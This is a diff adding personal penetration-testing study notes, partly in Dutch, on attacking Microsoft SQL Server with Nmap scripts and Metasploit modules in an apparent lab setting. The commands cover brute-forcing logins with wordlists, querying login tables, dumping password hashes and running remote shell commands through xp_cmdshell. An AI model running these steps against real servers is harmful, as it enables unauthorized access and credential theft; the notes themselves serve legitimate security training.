@@ -2555,3 +2555,65 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.t
 
 ### MSSQL Nmap scripts 
 
+- run nmap scan and service scan on port sql 
+- run script for ms-sql-info: nmap ip -p port --script ms-sql-info 
+- run script for ms-sql-ntlm-info: nmap ip -p port --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 
+		This script is designed to gather information related to Microsoft SQL Server using the NTLM authentication method.
+- run MSSQL brute force: nmap ip -p port --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt  
+- Check if there are any empty passwords: nmap ip -p port --script ms-sql-empty-password  
+- How to take advantange of results from bruteforce: 
+	- run query: nmap ip -p port --script ms-sql-query --script-args mmsql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT \* FROM master..syslogins"  -oN output.txt 
+
+![[Pasted image 20230613150808.png]]
+	- `--script ms-sql-query`: Hiermee geef je aan dat je de Nmap-script "ms-sql-query" wilt uitvoeren. Deze script maakt het mogelijk om aangepaste SQL-query's uit te voeren op de SQL Server-database.
+	`--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins"`: Dit geeft de argumenten door aan het script. Het stelt de gebruikersnaam (`mssql.username`) in op "admin" en het wachtwoord (`mssql.password`) op "anamaria". Het argument `ms-sql-query.query` bevat de specifieke SQL-query die je wilt uitvoeren op de database, in dit geval "SELECT * FROM master..syslogins".  De `syslogins`-tabel is specifiek voor Microsoft SQL Server-databases. Het is een systeemtabel die gebruikersaccounts en inloggegevens van de database bevat. Elke rij in deze tabel vertegenwoordigt een gebruikersaccount met bijbehorende informatie, zoals gebruikersnaam, wachtwoord en privileges.
+	- `-oN output.txt`: Dit zorgt ervoor dat de resultaten van de scan worden opgeslagen in het bestand "output.txt". Het rapport van de scan wordt opgeslagen in een normaal tekstbestand.
+
+- dump hashes: nmap ip -p port --script ms-sql-dump-hashes   --script-args mmsql.username=admin,mssql.password=anamaria
+
+
+- try to run code:  nmap ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="ipconfiig"
+(if successfull you are able to run commands in a shell remotely)
+
+
+- map ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="type c\flag.txt"   
+	(flag is windows version of cat (read a file))
+
+
+-- LAB -- 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### MSSQL Metasploit 
+
+- run service scan on sql ports 
+- run script for ms-sql-info (--script ms-sql-info)
+- use metasploit to bruteforce logon info 
+	- use aux scanner for ms-sql : mssql_login 
+	- setg rhost ip (setg stays persistent)
+	- set  user_file /root/Desktop/wordlist/common_users.txt 
+	- set set pass_file /root/desktop.wordlist/100-common-passwords.txt 
+	  
+- use another scanner: auxiliary/admin/mssql/mssql_enum 
+- use enum module: auxiliary/admin/mssql/mssql_sql_logins 
+- check if you can run commands: use auxiliary/admin/mssql/mssql_exec 
+	- set cmd whoami 
+- enumerate domain accounts:   use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+
+Domain accounts, in the context of Microsoft SQL Server, refer to user accounts that are managed and authenticated by a Windows Active Directory domain. These accounts are used to provide access to various resources within a domain, including SQL Server databases 
+
